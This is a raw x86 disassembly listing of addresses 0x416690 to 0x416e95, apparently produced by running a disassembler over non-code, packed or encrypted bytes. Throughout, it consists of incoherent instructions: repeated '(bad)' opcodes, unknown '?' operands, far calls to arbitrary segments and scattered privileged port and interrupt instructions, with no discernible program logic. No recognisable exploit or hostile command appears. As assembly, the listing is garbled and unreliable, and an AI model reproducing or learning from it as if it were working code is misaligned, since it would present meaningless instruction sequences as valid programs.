  416690:	loop   0x41665f
  416692:	xchg   esp,eax
  416693:	pop    esi
  416694:	and    esp,0x9aac62a3
  41669a:	fwait
  41669b:	pop    ecx
  41669c:	pop    ebp
  41669d:	add    dl,BYTE PTR [ebp-0x2b16236d]
  4166a3:	dec    ebx
  4166a4:	test   al,0xeb
  4166a6:	nop
  4166a7:	mov    ah,BYTE PTR [ebp+0x1b6dffe5]
  4166ad:	jmp    0x9095:0x5728aad4
  4166b4:	mov    edx,0xd356e3ca
  4166b9:	not    BYTE PTR [edi+0x7319aaf2]
  4166bf:	ds add al,0x51
  4166c2:	lock ficom DWORD PTR [esi+esi*8]
  4166c6:	scas   eax,DWORD PTR es:[edi]
  4166c7:	pop    ecx
  4166c8:	jmp    0xbed9:0x9ca47126
  4166cf:	cmovae ecx,DWORD PTR gs:[eax]
  4166d3:	xor    ebp,DWORD PTR [eax]
  4166d5:	jae    0x416673
  4166d7:	fisub  DWORD PTR [eax]
  4166d9:	fcom   DWORD PTR [esi+edi*2-0x73601fad]
  4166e0:	int    0x31
  4166e2:	ficom  WORD PTR [ebx-0x1c]
  4166e5:	std    
  4166e6:	call   0xfe94:0x34fc957
  4166ed:	jmp    0xa3a1:0x7a3fa9a4
  4166f4:	lods   al,BYTE PTR ds:[esi]
  4166f5:	fist   DWORD PTR [ebp+edi*8+0x4abb05b7]
  4166fc:	sbb    dh,BYTE PTR [esi-0x16f4e2a5]
  416702:	fstp   TBYTE PTR [eax-0x5b]
  416705:	popf   
  416706:	mov    edx,0xf64f75eb
  41670b:	dec    ecx
  41670c:	call   0xc6ca:0xebd12e0b
  416713:	xor    DWORD PTR [edx-0x2520bc10],edi
  416719:	cli    
  41671a:	adc    esp,DWORD PTR [ebx+ebx*2+0x860478f]
  416721:	ret    0x4a1a
  416724:	sbb    al,0xa4
  416726:	mov    esi,0xc91d2bab
  41672b:	jl     0x416747
  41672d:	sub    eax,0xddbd60c8
  416732:	mov    dh,0xf0
  416734:	and    esi,DWORD PTR [ebx]
  416736:	loope  0x4166ee
  416738:	inc    esp
  416739:	in     eax,dx
  41673a:	rol    DWORD PTR [esi-0x55900d88],0xab
  416741:	add    eax,0xd89b4bf2
  416746:	mov    bh,0xd7
  416748:	call   0xe0a6:0xb1e8
  41674e:	inc    esp
  41674f:	ja     0x416789
  416751:	daa    
  416752:	cmp    al,0xeb
  416754:	es in  al,dx
  416756:	pop    edi
  416757:	and    al,0xa0
  416759:	cmp    eax,0x41af2893
  41675e:	dec    ebx
  41675f:	(bad)  
  416760:	imul   esi,DWORD PTR [esi-0x57],0x8ede2413
  416767:	mov    bl,0x32
  416769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41676a:	cmp    eax,0x8ff7a1d2
  41676f:	dec    esp
  416770:	sub    eax,0x31ee08c
  416775:	pop    esp
  416776:	test   eax,0xbc9612a9
  41677b:	inc    edi
  41677c:	loop   0x4167dd
  41677e:	nop
  41677f:	fwait
  416780:	(bad)  
  416781:	dec    ebx
  416782:	add    eax,0x2bbf86d3
  416787:	vpaddusw xmm1,xmm7,xmm1
  41678b:	or     ah,dl
  41678d:	push   ebp
  41678e:	dec    ebx
  41678f:	mov    edi,esi
  416791:	pop    ecx
  416792:	or     DWORD PTR [ebx+0x26741199],ebp
  416798:	fwait
  416799:	popf   
  41679a:	test   BYTE PTR [eax-0x40],0xb
  41679e:	leave  
  41679f:	call   0xfc14:0xbe2bc3b7
  4167a6:	cli    
  4167a7:	scas   al,BYTE PTR es:[edi]
  4167a8:	pop    esp
  4167a9:	pop    esi
  4167aa:	js     0x4167ad
  4167ac:	mov    ah,0x8f
  4167ae:	or     dh,bl
  4167b0:	fwait
  4167b1:	mov    ch,0xe
  4167b3:	aas    
  4167b4:	push   eax
  4167b5:	pusha  
  4167b6:	mov    ds:0x5fc1c5e8,eax
  4167bb:	push   ecx
  4167bc:	sahf   
  4167bd:	mov    edx,0x1eaa46b5
  4167c2:	xor    al,0x5f
  4167c4:	adc    edx,0x27
  4167c7:	mov    bl,0xb9
  4167c9:	add    BYTE PTR [ecx],ch
  4167cb:	jns    0x416768
  4167cd:	test   BYTE PTR [ebx-0x44f103a0],ah
  4167d3:	dec    ecx
  4167d4:	sbb    esi,DWORD PTR [ebp+0x5b5ea2b8]
  4167da:	std    
  4167db:	cmp    eax,0xa83b8d9b
  4167e0:	daa    
  4167e1:	jl     0x4167b7
  4167e3:	stos   BYTE PTR es:[edi],al
  4167e4:	retf   0x74dd
  4167e7:	lods   al,BYTE PTR ds:[esi]
  4167e8:	arpl   WORD PTR [edx+0x7a7baf29],bx
  4167ee:	nop
  4167ef:	sbb    edx,DWORD PTR [eax]
  4167f1:	das    
  4167f2:	sbb    bl,al
  4167f4:	sti    
  4167f5:	imul   esp,DWORD PTR [eax+0x4a],0xffffffd5
  4167f9:	or     al,0x8a
  4167fb:	adc    DWORD PTR [edi+0x62],edx
  4167fe:	aad    0x3
  416800:	mov    ecx,0x5e76d023
  416805:	adc    eax,0xa5b7da83
  41680a:	mov    esp,0xc2de409f
  41680f:	pop    esi
  416810:	fdiv   DWORD PTR [edx]
  416812:	shl    BYTE PTR [edi],cl
  416814:	mov    esi,0xd7979067
  416819:	pushf  
  41681a:	cmc    
  41681b:	arpl   WORD PTR [esi+0x39],si
  41681e:	pop    ebp
  41681f:	dec    edx
  416820:	push   ebp
  416821:	inc    ebp
  416822:	lds    esp,FWORD PTR [edi+0x165fabcf]
  416828:	pop    ss
  416829:	jbe    0x4167bb
  41682b:	sub    BYTE PTR [edx-0x180f7094],0x5d
  416832:	fisttp QWORD PTR [ecx-0x38]
  416835:	mov    al,0x1
  416837:	xor    BYTE PTR [eax-0x64487fce],dh
  41683d:	leave  
  41683e:	add    BYTE PTR [edx+0x10e498cb],cl
  416844:	sbb    dh,bl
  416846:	int    0x97
  416848:	loopne 0x4168aa
  41684a:	sub    al,0xe4
  41684c:	and    ebp,esi
  41684e:	(bad)  
  41684f:	je     0x4168c1
  416851:	outs   dx,DWORD PTR ds:[esi]
  416852:	fdiv   DWORD PTR [edx]
  416854:	cmp    al,0xa4
  416856:	xchg   esp,eax
  416857:	dec    ecx
  416858:	into   
  416859:	into   
  41685a:	aad    0x15
  41685c:	mov    bl,0xda
  41685e:	ins    BYTE PTR es:[edi],dx
  41685f:	enter  0xc50d,0x90
  416863:	daa    
  416864:	out    dx,eax
  416865:	fnstenv [eax+0x9]
  416868:	inc    ecx
  41686a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41686b:	dec    ecx
  41686c:	sbb    al,0xe5
  41686e:	test   DWORD PTR ss:[eax+0x4c],eax
  416872:	mov    ch,0xb2
  416874:	fwait
  416875:	out    dx,al
  416876:	xor    eax,0x3e9362b6
  41687b:	(bad)  
  41687c:	rcr    BYTE PTR [eax+0x9],cl
  41687f:	ss mov bh,0x19
  416882:	into   
  416883:	push   ds
  416884:	sbb    ebx,DWORD PTR [esi+0x0]
  416887:	dec    ebp
  416888:	and    bl,BYTE PTR ss:[edx]
  41688b:	neg    DWORD PTR [ebx+0x4d377b60]
  416891:	pop    es
  416892:	aas    
  416893:	fs or  edx,edi
  416896:	int    0x78
  416898:	adc    eax,0xfd3f71de
  41689d:	mov    bx,0x9b27
  4168a1:	cmp    ch,BYTE PTR [ebp+0x78]
  4168a4:	jb     0x4168f5
  4168a6:	loopne 0x416887
  4168a8:	pop    es
  4168a9:	sbb    dl,BYTE PTR ds:0x1c7222f7
  4168af:	hlt    
  4168b0:	push   ebx
  4168b1:	ds push edx
  4168b3:	mov    bl,0x71
  4168b5:	loope  0x416846
  4168b7:	sar    DWORD PTR [esi+0x12f2655b],cl
  4168bd:	lds    ebp,FWORD PTR [ecx+0x68]
  4168c0:	push   DWORD PTR [ecx-0x43]
  4168c3:	leave  
  4168c4:	pop    edx
  4168c5:	add    al,0x60
  4168c7:	jbe    0x41688c
  4168c9:	pop    es
  4168ca:	xchg   edi,eax
  4168cb:	mov    al,ds:0x84e6a004
  4168d0:	sub    edx,ebx
  4168d2:	cld    
  4168d3:	mov    bh,0x79
  4168d5:	ficomp WORD PTR [ecx]
  4168d7:	dec    eax
  4168d8:	xor    al,0x89
  4168da:	fdivr  QWORD PTR [ebx]
  4168dc:	jno    0x416894
  4168de:	nop
  4168df:	rsqrtps xmm1,XMMWORD PTR [edi+0x6d49512c]
  4168e6:	stc    
  4168e7:	dec    edx
  4168e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168e9:	add    BYTE PTR [ecx],bl
  4168eb:	and    DWORD PTR [edx+0x6b2dcc7e],edi
  4168f1:	gs nop
  4168f3:	mov    esp,0x6840660
  4168f8:	out    dx,eax
  4168f9:	xor    al,0xb4
  4168fb:	fst    DWORD PTR [edi-0x22]
  4168fe:	sbb    bl,BYTE PTR [eax-0x5e528772]
  416904:	pop    eax
  416905:	outs   dx,BYTE PTR ds:[esi]
  416906:	nop
  416907:	call   0x159850f
  41690c:	pop    esp
  41690d:	mov    esi,0xddd83fb1
  416912:	dec    eax
  416913:	cwde   
  416914:	fadd   st(2),st
  416916:	or     bh,BYTE PTR [edi-0x5d]
  416919:	ret    
  41691a:	nop
  41691b:	rol    BYTE PTR [ebx-0x4a],cl
  41691e:	add    eax,0xe8db339f
  416923:	dec    ecx
  416924:	out    dx,al
  416925:	js     0x416992
  416927:	fidivr DWORD PTR [ecx+0xf]
  41692a:	jmp    0x506a049b
  41692f:	dec    esi
  416930:	mov    bh,0x91
  416932:	push   edi
  416933:	adc    al,0xd7
  416935:	fisttp QWORD PTR [ebp-0x7d76a1a8]
  41693b:	jbe    0x4169ae
  41693d:	in     eax,0xcc
  41693f:	sub    eax,0xdcdc5e60
  416944:	loop   0x416927
  416946:	mov    esp,0x57e18eb3
  41694b:	jno    0x41699d
  41694d:	lock rcr DWORD PTR [ebx+ebx*2],0x70
  416952:	out    dx,eax
  416953:	aas    
  416954:	pushf  
  416955:	cs push edi
  416957:	push   edi
  416958:	mov    dh,0x8a
  41695a:	inc    ecx
  41695b:	sbb    BYTE PTR [ebx],cl
  41695d:	push   ss
  41695e:	pop    ds
  41695f:	dec    edx
  416960:	xor    al,0xfe
  416962:	call   0x67cae2b1
  416967:	add    DWORD PTR [ebx-0x3e7468f2],0xffffffa5
  41696e:	(bad)
  416971:	sbb    edi,esp
  416973:	mov    ebx,0x3875f5cd
  416978:	dec    edx
  416979:	push   cs
  41697a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41697c:	fwait
  41697d:	cmp    esp,DWORD PTR [ebp+0x24]
  416980:	mov    edi,?
  416982:	sub    eax,0xbde209c
  416987:	lods   eax,DWORD PTR ds:[esi]
  416988:	out    0xe5,eax
  41698a:	bound  esp,QWORD PTR [ebp+0x44]
  41698d:	repz (bad) 
  41698f:	mov    bl,0xf0
  416991:	sbb    eax,0xf48e31c7
  416996:	fiadd  WORD PTR [ebx-0x5f]
  416999:	fucomp st(6)
  41699b:	cmc    
  41699c:	ret    0x2356
  41699f:	test   DWORD PTR [eax-0xd9c6f8a],esi
  4169a5:	mov    ebp,DWORD PTR [ebx+edx*4+0x4a79ac36]
  4169ac:	xchg   ebp,eax
  4169ad:	sub    al,0x6d
  4169af:	cmp    bh,BYTE PTR ds:0xa2ae48e3
  4169b5:	retf   
  4169b6:	jnp    0x4169a3
  4169b8:	ja     0x41697b
  4169ba:	loope  0x416970
  4169bc:	dec    eax
  4169bd:	outs   dx,DWORD PTR ds:[esi]
  4169be:	push   esp
  4169bf:	pop    ds
  4169c0:	xor    ebx,esi
  4169c2:	sub    al,0x7f
  4169c4:	mov    ebp,ecx
  4169c6:	pusha  
  4169c7:	mov    bl,0x6f
  4169c9:	push   ebx
  4169ca:	nop
  4169cb:	and    BYTE PTR [ecx-0x3c7b1cf2],bh
  4169d1:	mov    esi,0x1889517a
  4169d6:	push   ebp
  4169d7:	mov    DWORD PTR [edx+0x734e7081],0x9b89ae11
  4169e1:	and    bh,BYTE PTR [edi+0x597df4ab]
  4169e7:	shl    BYTE PTR [eax-0x6e5adce7],0xe5
  4169ee:	fwait
  4169ef:	mov    edx,0x689ea09f
  4169f4:	cmp    ebx,DWORD PTR [esi+0x63]
  4169f7:	sahf   
  4169f8:	stos   DWORD PTR es:[edi],eax
  4169f9:	les    edx,FWORD PTR [eax+0x4184a45d]
  4169ff:	js     0x41699d
  416a01:	or     al,0xa1
  416a03:	push   eax
  416a04:	push   ss
  416a05:	fmul   QWORD PTR [ebx-0x2242403e]
  416a0b:	cmp    DWORD PTR [esi+0x41],ecx
  416a0e:	nop
  416a0f:	jmp    0xe965:0x7b6c9d8e
  416a16:	or     BYTE PTR [esi],ch
  416a18:	adc    DWORD PTR [edi],edx
  416a1a:	ds push es
  416a1c:	fwait
  416a1d:	push   0xb1d9817b
  416a22:	bound  ebp,QWORD PTR [edx-0x65]
  416a25:	mov    dl,0xe5
  416a27:	ja     0x416a08
  416a29:	push   esi
  416a2a:	out    0x3d,al
  416a2c:	jne    0x416a0f
  416a2e:	mov    edi,DWORD PTR [edx+0x1216d649]
  416a34:	jae    0x416a78
  416a36:	mov    ch,bh
  416a38:	fwait
  416a39:	pop    edx
  416a3a:	jne    0x416a4a
  416a3c:	push   eax
  416a3d:	pop    edi
  416a3e:	es mul edx
  416a41:	frstor [ebp-0x15fd232f]
  416a47:	sub    BYTE PTR [ebp-0x45],al
  416a4a:	xchg   ecx,eax
  416a4b:	jmp    DWORD PTR [ebp+0x63e5b135]
  416a51:	and    al,0x50
  416a53:	xor    eax,0x1adede68
  416a58:	or     DWORD PTR [esp+ebx*2-0x70078384],0xfffffff8
  416a60:	leave  
  416a61:	iret   
  416a62:	cs mov ch,0x6b
  416a65:	daa    
  416a66:	cmovp  esp,DWORD PTR [eax+0x13ab9a25]
  416a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a6e:	sar    DWORD PTR [eax+0x66ecb89b],1
  416a74:	mov    cl,0x68
  416a76:	repz cdq 
  416a78:	xchg   esi,eax
  416a79:	into   
  416a7a:	jb     0x416ac6
  416a7c:	mov    esp,0x74cb04c6
  416a81:	lea    ebx,[eax+0x28eeb830]
  416a87:	push   ecx
  416a88:	fwait
  416a89:	pop    ds
  416a8a:	sub    eax,0x3e260862
  416a8f:	dec    edx
  416a90:	fisubr WORD PTR [ecx+ebp*8]
  416a93:	fldcw  WORD PTR [edi-0x6469ae51]
  416a99:	dec    BYTE PTR [edx]
  416a9b:	dec    edi
  416a9c:	jno    0x416ad3
  416a9e:	fldenv [edi+0x7964de37]
  416aa4:	add    al,0x42
  416aa6:	imul   esp,edi,0x14af0c2e
  416aac:	les    ebp,FWORD PTR [edx+0x50]
  416aaf:	cmp    eax,0x8b59ad47
  416ab4:	jne    0x416b05
  416ab6:	mov    esp,0xea365149
  416abb:	xchg   DWORD PTR [eax],ebx
  416abd:	add    esi,eax
  416abf:	mov    dl,0xb7
  416ac1:	pushf  
  416ac2:	adc    al,0x40
  416ac4:	sbb    al,0xf9
  416ac6:	and    BYTE PTR [ecx-0x1f],al
  416ac9:	jbe    0x416b23
  416acb:	add    eax,0x853fde79
  416ad0:	inc    edi
  416ad1:	popa   
  416ad2:	addr16 jmp 0x781f:0xc89f9eb2
  416ada:	mov    ecx,0x693dedd5
  416adf:	push   ecx
  416ae0:	jmp    0xf6a8b02c
  416ae5:	std    
  416ae6:	jmp    0xdcc0fd1
  416aeb:	cdq    
  416aec:	pushf  
  416aed:	xchg   edi,eax
  416aee:	jmp    0xc865a925
  416af3:	sbb    al,0x5d
  416af5:	ds sbb al,0x28
  416af8:	pop    eax
  416af9:	fisubr WORD PTR [ebp+0x1ece5610]
  416aff:	xchg   edx,eax
  416b00:	xor    ah,BYTE PTR [ebx]
  416b02:	nop
  416b03:	imul   edi,DWORD PTR [esi+0x65f6dd3],0x6b
  416b0a:	xchg   ebp,eax
  416b0b:	cmp    eax,0x70d01bd2
  416b10:	jmp    0x416ac7
  416b12:	sub    eax,0x17096f84
  416b17:	sbb    eax,0x4a755d24
  416b1c:	cmp    edi,DWORD PTR [edx+0x6d]
  416b1f:	int3   
  416b20:	fwait
  416b21:	add    BYTE PTR [ebp-0x461810bc],dh
  416b27:	lods   al,BYTE PTR ds:[esi]
  416b28:	addr16 in eax,dx
  416b2a:	push   edi
  416b2b:	xchg   BYTE PTR es:[ebx+0x4c4a9110],cl
  416b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b33:	js     0x416ad3
  416b35:	and    esp,DWORD PTR [esi+edx*2+0x53]
  416b39:	adc    eax,0xce940d6a
  416b3e:	add    dl,al
  416b40:	outs   dx,BYTE PTR ds:[esi]
  416b41:	loope  0x416b0b
  416b43:	add    ebp,DWORD PTR [esi+0x6b00f3c5]
  416b49:	repz test BYTE PTR [edi-0x5e],al
  416b4d:	xchg   edx,eax
  416b4e:	xlat   BYTE PTR ds:[ebx]
  416b4f:	sbb    eax,0x89af144f
  416b54:	leave  
  416b55:	ja     0x416b20
  416b57:	jmp    0x1de6:0x9a6afd6c
  416b5e:	xor    ah,BYTE PTR [ebp+0x61a999f9]
  416b64:	fwait
  416b65:	add    BYTE PTR [edi+0x23eb8c04],al
  416b6b:	xor    eax,0x31e3df26
  416b70:	jle    0x416bb7
  416b72:	inc    esp
  416b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b74:	xor    al,0xb6
  416b76:	lahf   
  416b77:	sbb    al,0x9b
  416b79:	inc    ecx
  416b7a:	fiadd  DWORD PTR [ebx-0x4e]
  416b7d:	cmc    
  416b7e:	rcl    esp,cl
  416b80:	ret    
  416b81:	fstp   QWORD PTR [ebp-0x27]
  416b84:	sahf   
  416b85:	mov    edi,0x971689ce
  416b8a:	xchg   ebx,eax
  416b8b:	mov    WORD PTR [ebx],?
  416b8d:	add    al,0x24
  416b8f:	jecxz  0x416b11
  416b91:	mov    es,edx
  416b93:	mov    edi,0xb1fddf6a
  416b98:	jmp    0x416b37
  416b9a:	js     0x416b90
  416b9c:	inc    ebx
  416b9d:	aas    
  416b9e:	popa   
  416b9f:	mov    dl,BYTE PTR [edx-0x17]
  416ba2:	mov    edx,0x9f0210aa
  416ba7:	inc    ebx
  416ba8:	imul   ebx,DWORD PTR [ecx+ebx*4],0x78e14229
  416baf:	aad    0xb8
  416bb1:	fstp   QWORD PTR [esi+0x36]
  416bb4:	ins    BYTE PTR es:[edi],dx
  416bb5:	dec    ecx
  416bb6:	sub    ebx,DWORD PTR [ebp+ecx*1+0x6d]
  416bba:	leave  
  416bbb:	dec    esi
  416bbc:	iret   
  416bbd:	pop    ebp
  416bbe:	xchg   ecx,esi
  416bc0:	sbb    al,0x3c
  416bc2:	adc    BYTE PTR [esi-0x38201f27],dl
  416bc8:	mov    bh,0xd1
  416bca:	ror    DWORD PTR [ecx],cl
  416bcc:	inc    esi
  416bcd:	mov    ah,0x30
  416bcf:	xor    al,0x3f
  416bd1:	sti    
  416bd2:	int3   
  416bd3:	enter  0xddf0,0x9b
  416bd7:	sub    ecx,ecx
  416bd9:	outs   dx,DWORD PTR ds:[esi]
  416bda:	xchg   esi,eax
  416bdb:	cmp    al,ch
  416bdd:	fnsave [ecx+ebp*8]
  416be0:	fcom   DWORD PTR [ebx-0x2b]
  416be3:	stc    
  416be4:	data16 not BYTE PTR [eax+0x6050ac1c]
  416beb:	mov    al,0xea
  416bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bee:	test   BYTE PTR [ecx],al
  416bf0:	icebp  
  416bf1:	in     al,dx
  416bf2:	ins    DWORD PTR es:[edi],dx
  416bf3:	inc    ecx
  416bf4:	mov    ah,BYTE PTR ds:0xc533050
  416bfa:	add    ecx,DWORD PTR [ebx+ebx*4]
  416bfd:	adc    eax,0x6ef0f2a0
  416c02:	mov    ds:0x68d5158e,eax
  416c07:	loopne 0x416c70
  416c09:	(bad)  
  416c0b:	mov    ebx,0x20fb6412
  416c10:	xchg   ebx,eax
  416c11:	cmp    eax,0xe1204a90
  416c16:	sbb    al,0x29
  416c18:	and    al,0x73
  416c1a:	add    al,0x4d
  416c1c:	dec    DWORD PTR [ecx+edx*2+0x26]
  416c20:	or     DWORD PTR [edx],0x4dfe9c31
  416c26:	sbb    eax,0x90b84ba9
  416c2b:	test   BYTE PTR [edx-0x71cc3bb0],cl
  416c31:	adc    al,0x54
  416c33:	imul   ebx,DWORD PTR [ebx-0x15],0x683409cb
  416c3a:	add    ebp,DWORD PTR [edi]
  416c3c:	dec    esi
  416c3d:	or     eax,0xfce70190
  416c42:	imul   edi,DWORD PTR [ecx+esi*1],0xe
  416c46:	jmp    0x416c9f
  416c48:	inc    edx
  416c49:	adc    DWORD PTR [edx-0x4906ff92],esi
  416c4f:	retf   0xeae
  416c52:	mov    ebp,0x904a2441
  416c57:	mov    eax,0x4fc4414b
  416c5c:	fs push edx
  416c5e:	fisttp DWORD PTR [ecx-0x67]
  416c61:	xchg   edi,eax
  416c62:	cmp    BYTE PTR [ebx-0x4c],0x21
  416c66:	mov    al,0x14
  416c68:	fwait
  416c69:	inc    ebx
  416c6a:	out    dx,al
  416c6b:	ins    BYTE PTR es:[edi],dx
  416c6c:	ds ja  0x416c40
  416c6f:	outs   dx,DWORD PTR ds:[esi]
  416c70:	out    0xdd,al
  416c72:	pop    edi
  416c73:	stos   DWORD PTR es:[edi],eax
  416c74:	push   0x33
  416c76:	pop    edx
  416c77:	xor    DWORD PTR [edi+0x49a98fee],ebx
  416c7d:	in     al,0x2c
  416c7f:	mov    esp,esp
  416c81:	dec    ecx
  416c82:	mov    esi,0x40825849
  416c87:	mov    dh,BYTE PTR [esi-0x7d]
  416c8a:	lods   eax,DWORD PTR ds:[esi]
  416c8b:	add    dh,bl
  416c8d:	popf   
  416c8e:	aaa    
  416c8f:	dec    edx
  416c90:	cmp    eax,0xb67fbf1f
  416c95:	outs   dx,DWORD PTR ds:[esi]
  416c96:	cs dec esi
  416c98:	cmp    BYTE PTR [ebx+0x5da87c9b],bh
  416c9e:	jl     0x416c45
  416ca0:	sub    eax,eax
  416ca2:	nop
  416ca3:	jae    0x416c74
  416ca5:	pop    edi
  416ca6:	in     eax,0xc2
  416ca8:	(bad)  
  416caa:	or     BYTE PTR [ecx-0x49],bl
  416cad:	retf   
  416cae:	je     0x416cca
  416cb0:	mov    ds:0x593d4d9d,al
  416cb5:	push   ebx
  416cb6:	pop    eax
  416cb7:	cld    
  416cb8:	xchg   DWORD PTR [esp+ebp*8-0x805eba4],edx
  416cbf:	inc    esi
  416cc0:	sbb    esi,DWORD PTR [ebx+0x4ddfb4a4]
  416cc6:	ror    BYTE PTR [ecx+0x10],0xc2
  416cca:	fdiv   DWORD PTR [ebx]
  416ccc:	sub    ah,bl
  416cce:	ja     0x416d42
  416cd0:	fwait
  416cd1:	je     0x416cb0
  416cd3:	adc    bl,dl
  416cd5:	push   ebp
  416cd6:	sub    edx,edi
  416cd8:	ss loope 0x416c5b
  416cdb:	pop    eax
  416cdc:	mov    ?,WORD PTR [esi-0x5f8c7480]
  416ce2:	jb     0x416d62
  416ce4:	sahf   
  416ce5:	les    ebx,FWORD PTR [ebx]
  416ce7:	xchg   ecx,eax
  416ce8:	fisub  WORD PTR [ecx-0x64b11573]
  416cee:	(bad)  
  416cef:	jo     0x416c7a
  416cf1:	mov    cl,0xd8
  416cf3:	pop    eax
  416cf4:	jmp    0x416cad
  416cf6:	mov    al,0xc0
  416cf8:	sbb    BYTE PTR ds:0x369bc25e,bl
  416cfe:	(bad)  
  416cff:	pop    edx
  416d00:	repz sbb ch,0xc7
  416d04:	icebp  
  416d05:	fnsave ds:0xba4eb2dc
  416d0b:	jbe    0x416cc4
  416d0d:	add    BYTE PTR [eax-0x48445034],dl
  416d13:	pop    esp
  416d14:	mov    eax,edi
  416d16:	daa    
  416d17:	dec    edx
  416d18:	mov    ds:0x20598529,al
  416d1d:	or     edx,DWORD PTR [edi-0x61]
  416d20:	mov    ds:0x16b3d0e7,al
  416d25:	jge    0x416cb7
  416d27:	adc    al,0xf8
  416d29:	xor    BYTE PTR [edx-0x2b5111b7],0x32
  416d30:	dec    edi
  416d31:	xchg   esp,eax
  416d32:	xlat   BYTE PTR fs:[ebx]
  416d34:	fwait
  416d35:	(bad)  
  416d36:	jae    0x416cc4
  416d38:	xor    eax,0x8201671f
  416d3d:	in     eax,0x9b
  416d3f:	or     BYTE PTR [edi+0x5d19eeb1],dl
  416d45:	lahf   
  416d46:	cmc    
  416d47:	mov    al,0x9b
  416d49:	sub    cl,BYTE PTR [esp+edx*2]
  416d4c:	inc    ecx
  416d4d:	iret   
  416d4e:	xchg   edx,eax
  416d4f:	mov    dh,0x57
  416d51:	fimul  WORD PTR [esi+0x2a]
  416d54:	cmp    eax,DWORD PTR [edi]
  416d56:	and    ebp,esp
  416d58:	mov    edx,0xc8de9027
  416d5d:	outs   dx,DWORD PTR ds:[esi]
  416d5e:	data16 (bad) 
  416d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d61:	sbb    al,0x53
  416d63:	dec    edx
  416d64:	data16 inc sp
  416d67:	sahf   
  416d68:	cmp    ecx,DWORD PTR [edi+0x419be4d6]
  416d6e:	sub    DWORD PTR [eax-0x39a1eae3],eax
  416d74:	adc    eax,0xeefa68de
  416d79:	das    
  416d7a:	aas    
  416d7b:	jnp    0x416df3
  416d7d:	loop   0x416d0e
  416d7f:	push   ebx
  416d80:	xchg   esi,eax
  416d81:	sbb    eax,0xd6eb7718
  416d86:	repnz dec ecx
  416d88:	mov    edx,0xfb281d57
  416d8d:	jge    0x416e07
  416d8f:	js     0x416d2c
  416d91:	adc    BYTE PTR [esp+edi*8],0xe5
  416d95:	add    eax,0xdda646c6
  416d9a:	loope  0x416d58
  416d9c:	dec    esp
  416d9d:	(bad)  
  416d9e:	jmp    0x90dc8e50
  416da3:	outs   dx,BYTE PTR ds:[esi]
  416da4:	adc    edx,DWORD PTR [edi+0x33]
  416da7:	call   0xf819:0x8611696c
  416dae:	bt     edx,0x9c
  416db2:	(bad)  
  416db3:	jp     0x416d95
  416db5:	xchg   esp,eax
  416db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416db7:	adc    eax,0xba23937
  416dbc:	fwait
  416dbd:	shl    BYTE PTR [ecx+0x4f],0xbc
  416dc1:	xor    ebx,DWORD PTR [ebp+0x20ca8f49]
  416dc7:	jbe    0x416da0
  416dc9:	repnz add ah,ch
  416dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dcd:	outs   dx,BYTE PTR ds:[esi]
  416dce:	xchg   ebx,eax
  416dcf:	or     al,0xa5
  416dd1:	fnstsw WORD PTR [ebp-0x31]
  416dd4:	pop    ecx
  416dd5:	inc    eax
  416dd6:	sbb    ecx,DWORD PTR [edx+0x3e]
  416dd9:	imul   BYTE PTR [eax-0x46]
  416ddc:	les    ecx,FWORD PTR [ebx]
  416dde:	mov    bh,0xa1
  416de0:	pushf  
  416de1:	cwde   
  416de2:	ins    BYTE PTR es:[edi],dx
  416de3:	jg     0x416dc9
  416de5:	xor    al,0x1d
  416de7:	push   esp
  416de8:	retf   
  416de9:	and    ebx,DWORD PTR [esi]
  416deb:	pop    ecx
  416dec:	mov    edi,0x3b34886f
  416df1:	jne    0x416d9a
  416df3:	add    eax,0x7c977902
  416df8:	cwde   
  416df9:	imul   eax,DWORD PTR [ebp+0x6ac45b1d],0xa9dddfa9
  416e03:	into   
  416e04:	xchg   esi,eax
  416e05:	inc    BYTE PTR [edi+ebp*8+0x1]
  416e09:	mov    ds:0x6d25589f,al
  416e0e:	(bad)  
  416e0f:	js     0x416de0
  416e11:	in     al,dx
  416e12:	fcmovne st,st(1)
  416e14:	and    edx,DWORD PTR ss:[eax+eiz*8]
  416e18:	or     dh,bl
  416e1a:	icebp  
  416e1b:	popf   
  416e1c:	pop    ecx
  416e1d:	ret    
  416e1e:	cmp    DWORD PTR [edi],edx
  416e20:	and    edx,0xffffff96
  416e23:	iret   
  416e24:	jns    0x416e94
  416e26:	scas   eax,DWORD PTR es:[edi]
  416e27:	mov    bx,0x6c09
  416e2b:	mov    bh,0x33
  416e2d:	cli    
  416e2e:	push   0x7b1e673c
  416e33:	shl    BYTE PTR [ecx-0x2c1d23d2],cl
  416e39:	push   edx
  416e3a:	ror    DWORD PTR [ecx+0x3c],1
  416e3d:	int3   
  416e3e:	mov    ebx,0x3e4afa53
  416e43:	dec    ebx
  416e44:	pop    ss
  416e45:	adc    esp,ebp
  416e47:	loope  0x416e28
  416e49:	(bad)  
  416e4a:	mov    ds:0x907f2415,al
  416e4f:	call   0x13fd:0xf2304168
  416e56:	int3   
  416e57:	dec    ecx
  416e58:	pop    ds
  416e59:	les    edx,FWORD PTR [ecx-0x2e]
  416e5c:	repnz enter 0x4347,0x9b
  416e61:	icebp  
  416e62:	clc    
  416e63:	(bad)  
  416e64:	sub    al,0xe8
  416e66:	add    DWORD PTR [eax-0x59e4223e],ebp
  416e6c:	aam    0x47
  416e6e:	dec    sp
  416e70:	or     DWORD PTR [ebx-0x4a],esp
  416e73:	test   al,0x36
  416e75:	xchg   ebp,eax
  416e76:	lahf   
  416e77:	xlat   BYTE PTR ds:[ebx]
  416e78:	int3   
  416e79:	popf   
  416e7a:	or     eax,0xa6e412c8
  416e7f:	dec    ecx
  416e80:	mov    ebx,0x5e200f89
  416e85:	pop    edx
  416e86:	dec    edi
  416e87:	ins    BYTE PTR es:[edi],dx
  416e88:	adc    edi,DWORD PTR [edi+ecx*8+0x6d]
  416e8c:	icebp  
  416e8d:	pop    ebp
  416e8e:	call   0x906f:0x6783d02
  416e95:	fiadd  WORD PTR [eax]
